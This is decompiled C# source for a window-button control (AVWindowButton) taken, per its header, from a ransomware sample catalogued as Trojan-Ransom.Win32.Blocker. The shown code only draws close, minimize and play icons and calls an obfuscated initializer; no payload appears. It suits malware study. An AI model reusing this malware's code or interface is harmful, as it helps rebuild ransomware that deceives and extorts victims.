// Decompiled with JetBrains decompiler
// Type: FileLocker.AVWindowButton
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class AVWindowButton : Control
  {
    private static List<WeakReference> __ENCList;
    private Color Hover;
    private string _SetImage;

    [DebuggerNonUserCode]
    static AVWindowButton()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AVWindowButton.__ENCList = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (AVWindowButton.__ENCList)
      {
        if (AVWindowButton.__ENCList.Count == AVWindowButton.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (AVWindowButton.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (AVWindowButton.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                AVWindowButton.__ENCList[index1] = AVWindowButton.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          AVWindowButton.__ENCList.RemoveRange(index1, checked (AVWindowButton.__ENCList.Count - index1));
          AVWindowButton.__ENCList.Capacity = AVWindowButton.__ENCList.Count;
        }
        AVWindowButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    public AVWindowButton()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      AVWindowButton.__ENCAddToList((object) this);
      this.Hover = Color.FromArgb(242, 242, 242);
      this._SetImage = "Close";
      this.Size = new Size(33, 33);
      this.DoubleBuffered = true;
      this.SetStyle(ControlStyles.SupportsTransparentBackColor, true);
      this.BackColor = Color.Transparent;
    }

    [TypeConverter(typeof (btnimProperty))]
    [Category("Misc")]
    [Description("Select Image from the list")]
    public string SetImage
    {
      get => this._SetImage;
      set => this._SetImage = value;
    }

    protected override void OnMouseEnter(EventArgs e)
    {
      this.Hover = Color.FromArgb(228, 228, 228);
      this.Invalidate();
      base.OnMouseEnter(e);
    }

    protected override void OnMouseLeave(EventArgs e)
    {
      this.Hover = Color.FromArgb(242, 242, 242);
      this.Invalidate();
      base.OnMouseEnter(e);
    }

    protected override void OnMouseUp(MouseEventArgs e)
    {
      this.Hover = Color.FromArgb(214, 214, 214);
      this.Invalidate();
      base.OnMouseUp(e);
    }

    protected override void OnMouseDown(MouseEventArgs e)
    {
      this.Hover = Color.FromArgb(151, 151, 151);
      this.Invalidate();
      this.OnMouseClick(e);
    }

    public GraphicsPath RoundRect(Rectangle rectangle_0, int int_0)
    {
      GraphicsPath graphicsPath1 = new GraphicsPath();
      int num = checked (int_0 * 2);
      GraphicsPath graphicsPath2 = graphicsPath1;
      Rectangle rectangle = new Rectangle(rectangle_0.X, rectangle_0.Y, num, num);
      Rectangle rect1 = rectangle;
      graphicsPath2.AddArc(rect1, -180f, 90f);
      GraphicsPath graphicsPath3 = graphicsPath1;
      rectangle = new Rectangle(checked (rectangle_0.Width - num + rectangle_0.X), rectangle_0.Y, num, num);
      Rectangle rect2 = rectangle;
      graphicsPath3.AddArc(rect2, -90f, 90f);
      GraphicsPath graphicsPath4 = graphicsPath1;
      rectangle = new Rectangle(checked (rectangle_0.Width - num + rectangle_0.X), checked (rectangle_0.Height - num + rectangle_0.Y), num, num);
      Rectangle rect3 = rectangle;
      graphicsPath4.AddArc(rect3, 0.0f, 90f);
      GraphicsPath graphicsPath5 = graphicsPath1;
      rectangle = new Rectangle(rectangle_0.X, checked (rectangle_0.Height - num + rectangle_0.Y), num, num);
      Rectangle rect4 = rectangle;
      graphicsPath5.AddArc(rect4, 90f, 90f);
      graphicsPath1.AddLine(new Point(rectangle_0.X, checked (rectangle_0.Height - num + rectangle_0.Y)), new Point(rectangle_0.X, checked (int_0 + rectangle_0.Y)));
      return graphicsPath1;
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      base.OnPaint(e);
      Graphics graphics = e.Graphics;
      graphics.SmoothingMode = SmoothingMode.HighQuality;
      graphics.FillPath((Brush) new SolidBrush(Color.FromArgb(this.Hover.ToArgb())), this.RoundRect(new Rectangle(0, 0, checked (this.Width - 1), checked (this.Height - 1)), 3));
      graphics.SmoothingMode = SmoothingMode.None;
      if (Operators.CompareString(this._SetImage, "Close", false) == 0)
      {
        using (Pen pen = new Pen(Brushes.DimGray, 2f))
        {
          pen.StartCap = LineCap.Triangle;
          pen.EndCap = LineCap.Triangle;
          graphics.DrawLine(pen, 6, 6, checked (this.Width - 6), checked (this.Height - 6));
          graphics.DrawLine(pen, checked (this.Width - 6), 6, 6, checked (this.Height - 6));
        }
      }
      else if (Operators.CompareString(this._SetImage, "Minimize", false) == 0)
      {
        using (Pen pen = new Pen(Brushes.DimGray, 2f))
        {
          pen.StartCap = LineCap.Triangle;
          pen.EndCap = LineCap.Triangle;
          graphics.DrawLine(pen, 6, checked (this.Height - 6), checked (this.Width - 6), checked (this.Height - 6));
        }
      }
      else if (Operators.CompareString(this._SetImage, "Maximize", false) == 0)
      {
        using (Pen pen = new Pen(Brushes.DimGray, 2f))
        {
          pen.StartCap = LineCap.Triangle;
          pen.EndCap = LineCap.Triangle;
          graphics.FillRectangle((Brush) new SolidBrush(Color.FromArgb(this.Hover.ToArgb())), 6, 8, 16, 13);
          graphics.DrawRectangle(pen, 6, 8, 16, 13);
          graphics.FillRectangle((Brush) new SolidBrush(Color.FromArgb(this.Hover.ToArgb())), 12, checked (this.Height - 19), 16, 13);
          graphics.DrawRectangle(pen, 12, checked (this.Height - 19), 16, 13);
        }
      }
      else if (Operators.CompareString(this._SetImage, "Stop", false) == 0)
      {
        Rectangle rect = new Rectangle(checked ((int) Math.Round(unchecked ((double) this.Height / 2.0 - 6.0))), checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - 6.0))), 12, 12);
        graphics.FillRectangle((Brush) new SolidBrush(Color.DimGray), rect);
      }
      else
      {
        if (Operators.CompareString(this._SetImage, "Play", false) != 0)
          return;
        graphics.SmoothingMode = SmoothingMode.AntiAlias;
        PointF[] points = new PointF[4]
        {
          new PointF(10f, 10f),
          new PointF((float) checked (this.Width - 10), (float) this.Height / 2f),
          new PointF(10f, (float) checked (this.Height - 10)),
          new PointF(10f, 10f)
        };
        GraphicsPath path = new GraphicsPath(FillMode.Alternate);
        path.AddLines(points);
        path.CloseFigure();
        graphics.FillPath(Brushes.DimGray, path);
      }
    }
  }
}
